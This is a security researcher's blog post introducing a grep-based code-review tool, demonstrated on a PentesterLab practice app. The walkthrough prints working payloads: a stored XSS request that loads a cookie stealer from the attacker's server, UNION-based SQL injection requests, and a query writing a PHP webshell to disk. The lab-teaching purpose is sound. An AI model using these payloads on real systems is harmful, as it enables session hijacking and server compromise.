<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Grep Static Analysis Security Tool (gSAST)" /><meta name="author" content="Gustavo Bonito" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://gustavobonito.pt/posts/gsast/" /><meta property="og:url" content="https://gustavobonito.pt/posts/gsast/" /><meta property="og:site_name" content="Gustavo Bonito" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-31T19:30:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Grep Static Analysis Security Tool (gSAST)" /><meta name="twitter:site" content="@gb0n1t0" /><meta name="twitter:creator" content="@Gustavo Bonito" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Gustavo Bonito"},"headline":"Grep Static Analysis Security Tool (gSAST)","dateModified":"2021-06-25T23:01:16+01:00","datePublished":"2021-03-31T19:30:00+01:00","description":"Introduction","url":"https://gustavobonito.pt/posts/gsast/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://gustavobonito.pt/posts/gsast/"},"@context":"https://schema.org"}</script><title>Grep Static Analysis Security Tool (gSAST) | Gustavo Bonito</title><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-182648705-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-182648705-1'); }); </script> <script data-ad-client="ca-pub-5972782531617043" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gustavo Bonito</a></div><div class="site-subtitle font-italic">Security Researcher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/b0n1t0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/gb0n1t0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/b0n1t0" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Grep Static Analysis Security Tool (gSAST)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Grep Static Analysis Security Tool (gSAST)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 31, 2021, 7:30 PM +0100" > Mar 31 <i class="unloaded">2021-03-31T19:30:00+01:00</i> </span> by <span class="author"> Gustavo Bonito </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 25, 2021, 11:01 PM +0100" > Jun 25 <i class="unloaded">2021-06-25T23:01:16+01:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1471 words">8 min</span></div></div><div class="post-content"><h1 id="introduction">Introduction</h1><hr /><p>Grep Static Analysis Security Tool or gSAST is a tool that I’ve developed for the OSWE certification, using shell scripting (bash), in order to simplify the process of manual source code analysis.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/9d8280eac1464869a8554701aa913f35.png" alt="" /> <em>gSAST available options</em></p><p><em>Note: It is important to note that gSAST <strong>is not</strong> any sort of vulnerability scanner.</em></p><h1 id="how-does-it-work-">How does it work ?</h1><hr /><p>gSAST requires “grep” to work and uses its pattern files to find vulnerable code. At the moment, the vulnerabilities identified by the pattern files are mainly focused on the OSWE certification, but in the future I will add more.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/15f4566e5cdd4e2fa86218da0cd09d82.png" alt="" /> <em>gSAST overall view</em></p><p>This tool is organized in the following manner:</p><ul><li>gSAST.sh - Main script that uses “.rules” files to find vulnerable code<li>/patterns/*.rules - Grep pattern files that include signatures for common vulnerabilities<ul><li>“.rules” files are organized by order of analysis approach using numbered filenames, and by vulnerability type for each web application language (ex. php, java, etc…)</ul></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gSAST.sh --&gt; patterns/"source_code_language"/"vulnerability_type".rules --&gt; Vulnerable Code
</pre></table></code></div></div><h1 id="demonstration">Demonstration</h1><hr /><p>To demonstrate the functionality of gSAST, I will solve the <a href="https://pentesterlab.com/exercises/xss_and_mysql_file/course">“XSS and MySQL FILE” challenge from PentesterLab</a> from a white-box approach.</p><p>Before starting to find vulnerabilities, I usually like to map the application, enter valid information and try to understand its behavior and purpose.</p><p>Since this is a simple application the functionalities are easily identifiable, such as:</p><p><strong>User</strong></p><ul><li>Read posts<li>Insert comments</ul><p><strong>Admin</strong></p><ul><li>Create / Read / Edit / Delete posts<li>Insert / (Edit / Delete) comments</ul><p>The purpose of this application is to work as a blog where a user can read posts and insert comments, and the administrator can manage them.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/6a8a048fc386458b9f4da747dd60f239.png" alt="" /> <em>Web application main page</em></p><p>For the source code analysis process, I’ll be using only gSAST, Visual Code / Vim and Unix tools (find, grep, etc).</p><p>The application source code is relatively small compared to a real application, as seen by the pictures below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/9d6a9e74fd0d45f89d0836e61da088cc.png" alt="" /> <em>Source code files</em></p><p>By going through all PHP files it was possible to find that the code is only 619 lines long.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/08ed0cda276846ce8544dd9e26e4bc0e.png" alt="" /> <em>Source code size</em></p><h2 id="running-gsast">Running gSAST</h2><p>Starting off by running gSAST it possible to see many interesting findings such as:</p><ul><li>Database Credentials<li>Possible Cross-Site Scripting<li>Possible SQL Injection<li>And many more…</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/f357da92b1b24110af006d647074037b.png" alt="" /> <em>gSAST initial run</em></p><p>I used the following gSAST flags to include only PHP files:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./gSAST.sh -l php -i "*.php" ./source
</pre></table></code></div></div><h2 id="stored-cross-site-scripting">Stored Cross-Site Scripting</h2><p>After understanding the web application purpose and looking at gSAST output, my main focus was to get administrative access, and for that I focused on Cross-Site Scripting vulnerabilities, since I had access to the comments feature.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/8655e013d57c4b3182131da4427fe948.png" alt="" /> <em>Test post page</em></p><p>As it can be seen in the picture below the “text” field is not properly sanitizing user input with the “htmlentities()” function, possibly allowing Stored Cross-Site Scripting, since comments are saved in the database and reflected back to the user.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/7946f82ace0c44c4bea20938ffa5af71.png" alt="" /> <em>gSAST - Cross-Site Scripting vulnerable code</em></p><p>To confirm this finding I accessed the “post.php” class file and noticed a call for a “get_comments()” function, so I searched for its usage in the code to fully understand it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/0d25d544740940f69addac7579a96e0e.png" alt="" /> <em>Analysis of the “render_with_comments()” function</em></p><p>The “get_comments()” function simply requests the “comments” table for its data, given a post identifier, and returns it back to the user. The only validation in place is in the “post_id” parameter that checks if the input is an integer. No other validation is in place to prevent Cross-Site Scripting.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/a08fd1817a1c4280b955cd51eb669977.png" alt="" /> <em>Analysis of the “get_comments()” function</em></p><p>Since my goal was to get administrative access to the application, I injected a simple script tag that would load an external Javascript file from my server, with the purpose stealing the administrator cookie.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>POST /post_comment.php?id=1 HTTP/1.1
Host: 192.168.56.118
Content-Type: application/x-www-form-urlencoded
Content-Length: 295
Connection: close

title=test&amp;author=test&amp;text=%3Cscript+src%3D%22http%3A%2F%2F192.168.56.1%2Fcookie-stealer.js%22%3E%3C%2Fscript%3E&amp;submit=Submit+Query
</pre></table></code></div></div><p>The “cookie-stealer.js” file purpose is, like the name suggests, to steal the current user session cookie, when he/she accesses the webpage with the malicious comment.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/2a45b52e43bf47ef9672153798df4482.png" alt="" /> <em>Javascript cookie stealer</em></p><p>Since an administrator is able to read all comments, I just had to wait for a connection to my server.</p><h3 id="session-riding">Session Riding</h3><p>After a few seconds I get a request on my server containing the administrator session cookie.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/64471bbe808746e8a2445366a6edd80d.png" alt="" /> <em>GET request containing the administrator cookie</em></p><p>With the administrator cookie on hands I could access the administration panel, as seen in the picture below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/e16fc9b40a1e41e5b8040452f4365b7d.png" alt="" /> <em>Administration panel access</em></p><h2 id="sql-injection">SQL Injection</h2><p>With administrative access to the web application, my focus now was to get code execution on the server. Going back to the initial gSAST results, there were still a few blocks of code with possible SQL Injection vulnerabilities to analyze.</p><h3 id="database-logging">Database Logging</h3><p>Since this is a white-box approach and I was determined to go through all the SQL Injection related findings from gSAST, I started by setting up database logging to monitor all SQL queries.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/e1b31de1ab69472eb9bd86db08512f2a.png" alt="" /> <em>Enabling database logging in the “/etc/mysql/my.cnf” file</em></p><p>After restarting the MySQL service I started seeing queries in the log files.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/2f9f42b2c3374ff79318815d6af32584.png" alt="" /> <em>Log file with SQL queries</em></p><h3 id="vulnerable-sql-queries">Vulnerable SQL Queries</h3><p>The query that caught my eye was the SELECT statement that was directly concatenated with the “id” parameter, given by the user, and didn’t seem to have any type of sanitization.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/5549896c5a594e0eb0d2950a5809b76e.png" alt="" /> <em>gSAST - SQL Injection vulnerable code</em></p><p>But once again to confirm this finding, I had to access the file that contained the vulnerable code and further analyze it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/68190ad5e2a4436c8469ac170bf50ac1.png" alt="" /> <em>Analysis of the “get_comments()” function</em></p><p>As seen by the picture above, the “find()” function was responsible for finding posts by their “id”. Since there was no input sanitization in this function, the only thing left to confirm the vulnerability was to analyze its calls. For this purposed I used “grep” once again.</p><p>A few calls were found for this function, but the one that stand out the most was in the “edit.php” file in the administrative area (that I had access).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/7609aff32be8406b9dd087d854d724c9.png" alt="" /> <em>Source code search for “find()” function calls</em></p><p>Before proceeding with the code analysis, I always like to check the page itself to better understand its purpose and usage.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/a912e60248ff49f39e6809f816e66c10.png" alt="" /> <em>“edit.php” page</em></p><p>The only purpose of the “find()” function call, was to find a post by its identifier and further update its contents. As seen by the picture below, there is no sanitization in place so it looks like the application is vulnerable to SQL Injection.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/0a74ec52a3084e3bb6acf82777593614.png" alt="" /> <em>Analysis of the “find()” function call</em></p><h3 id="database-structure-analysis">Database Structure Analysis</h3><p>From the previous analysis it was possible to conclude that the application was vulnerable to SQL Injection, and that the injected query would need to have a UNION SELECT statement to concat the information from the “posts” table with any other table. Since a UNION query needs to have the exact same number of columns as the initial SELECT query, I used the previously gathered database credentials to analyze the “posts” table structure and find the exact number of columns to include in the PoC query.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/09aa4baeea1a45f7b38b533ae39a1d53.png" alt="" /> <em>Database access and table structure comparison</em></p><h3 id="sql-injection---exploitation">SQL Injection - Exploitation</h3><p>With all the information gathered from the previous analysis, it was now time to build an actual query to inject. Since it was just a Proof of Concept I started by injecting a simple sleep() function to suspend the HTTP response for 10 seconds.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>GET /admin/edit.php?id=1+UNION+SELECT+1,(SELECT+sleep(10)),3,4+--+- HTTP/1.1
Host: 192.168.56.118
Cookie: PHPSESSID=7kg82uff32fgejeuhvu9c0rvl6
Connection: close
</pre></table></code></div></div><p><em>GET request with the SQL sleep() function</em></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT * FROM posts WHERE id=1 UNION SELECT 1,(SELECT SLEEP(10)),3,4 -- -
</pre></table></code></div></div><p><em>Database query with the injected sleep() function</em></p><p>Success! I was now able to fully compromise the database data by injecting malicious SQL queries.</p><h3 id="from-sql-injection-to-remote-code-execution">From SQL Injection to Remote Code Execution</h3><p>To complete this challenge, I had to inject an SQL query that would allow me to get code execution on the server.</p><p>For this purpose I used a well known method that allowed arbitrary file writing by using the SQL “INTO OUTFILE” statement. The final task was to find a directory where the “www-data” user had write privileges and upload a PHP webshell to the server.</p><p>Since this was a white-box assessment, I quickly found the “/var/www/admin/uploads/” directory.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT * FROM posts WHERE id=1 UNION SELECT 1,(SELECT '&lt;?php echo system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/admin/uploads/cmd.php'),3,4 -- -
</pre></table></code></div></div><p><em>Database query with the PHP webshell code</em></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>GET /admin/edit.php?id=UNION+SELECT+1,(SELECT+'&lt;%3fphp+echo+system($_GET["cmd"])%3b+%3f&gt;'+INTO+OUTFILE+'/var/www/admin/uploads/cmd.php'),3,4+--+- HTTP/1.1
Host: 192.168.56.118
Cookie: PHPSESSID=7kg82uff32fgejeuhvu9c0rvl6
Connection: close
</pre></table></code></div></div><p><em>GET request with the final SQL Injection payload</em></p><p>After sending the request, I noticed the “cmd.php” file was created and contained the malicious PHP code, as seen in the picture below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/fc0ab53002f74b5a84324a49199c34ae.png" alt="" /> <em>Result of the previous SQL Injection request</em></p><p>With the uploaded webshell I could now execute arbitrary system commands on the target and get a reverse shell. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/content/1305032144064dddb649f53a6c7cf7f5.png" alt="" /> <em>Webshell system command execution</em></p><h1 id="conclusion">Conclusion</h1><hr /><p>My goal with this post was to demonstrate the usage and functionalities of the Grep Static Analysis Security Tool (gSAST), and present a different approach to a good challenge from PentesterLab.</p><p>Feel free to help me develop the gSAST tool by committing new vulnerability signatures or requesting new functionalities on the following Github page:</p><ul><li><a href="https://github.com/b0n1t0/gSAST">https://github.com/b0n1t0/gSAST</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/oswe/'>OSWE</a>, <a href='/categories/development/'>Development</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oswe/" class="post-tag no-text-decoration" >OSWE</a> <a href="/tags/development/" class="post-tag no-text-decoration" >Development</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Grep Static Analysis Security Tool (gSAST) - Gustavo Bonito&url=https://gustavobonito.pt/posts/gsast/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://gustavobonito.pt/posts/gsast/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/gsast/">Grep Static Analysis Security Tool (gSAST)</a><li><a href="/posts/htb-notebook/">Hack The Box - The Notebook</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/capture-the-flag/">Capture The Flag</a> <a class="post-tag" href="/tags/development/">Development</a> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/oswe/">OSWE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-notebook/"><div class="card-body"> <span class="timeago small" > Mar 7 <i class="unloaded">2021-03-07T17:30:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - The Notebook</h3><div class="text-muted small"><p> Introduction This is a write-up for the The Notebook (Medium) machine, released on Hack The Box on 06/03/21. Reconnaissance Service Enumeration Ports / Services enumeration Since there we...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-notebook/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - The Notebook</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/b0n1t0">Gustavo Bonito</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."> Some rights reserved. </span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/capture-the-flag/">Capture The Flag</a> <a class="post-tag" href="/tags/development/">Development</a> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/oswe/">OSWE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://gustavobonito.pt{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
